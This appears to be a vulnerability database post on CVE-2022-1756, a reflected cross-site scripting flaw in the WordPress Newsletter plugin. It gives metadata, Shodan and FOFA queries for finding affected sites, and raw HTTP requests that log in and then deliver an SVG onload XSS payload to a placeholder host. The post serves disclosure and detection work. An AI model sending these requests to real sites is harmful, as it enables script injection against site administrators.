---
layout: post
cve_id: CVE-2022-1756
title: Newsletter < 7.4.5 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2022/CVE-2022-1756.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-1756.yaml
snort2_rule: N/A
snort3_rule: N/A
author: Harsh
severity: medium
impact: 'Allows attackers to inject malicious scripts into web pages viewed by users,
  leading to potential data theft or unauthorized actions.

  '
remediation: Fixed in version 7.4.5
reference:
- https://wpscan.com/vulnerability/6ad407fe-db2b-41fb-834b-dd8c4f62b072
- https://nvd.nist.gov/vuln/detail/CVE-2022-1756
- https://wordpress.org/plugins/newsletter/
- https://github.com/ARPSyndicate/cvemon
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2022-1756
  cwe-id: CWE-79
  epss-score: 0.03183
  epss-percentile: 0.86585
  cpe: cpe:2.3:a:thenewsletterplugin:newsletter:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 2
  vendor: thenewsletterplugin
  product: newsletter
  framework: wordpress
  shodan-query: http.html:/wp-content/plugins/newsletter/
  fofa-query: body=/wp-content/plugins/newsletter/
  publicwww-query: /wp-content/plugins/newsletter/
tags:
- cve
- cve2022
- wpscan
- newsletter
- xss
- authenticated
- thenewsletterplugin
- wordpress
- vuln
---

## ðŸ” Vulnerability Description
The Newsletter WordPress plugin before 7.4.5 does not sanitize and escape the $_SERVER['REQUEST_URI'] before echoing it back in admin pages. Although this uses addslashes, and most modern browsers automatically URLEncode requests, this is still vulnerable to Reflected XSS in older browsers such as Internet Explorer 9 or below.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
Connection: close
Content-Length: 38
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

log=9ROPKI&pwd=qKVKms&wp-submit=Log+In
```

```nohighlight
GET /wp-admin/admin.php?page=newsletter_main_index&debug&"><svg/onload=alert(/document.domain/)> HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

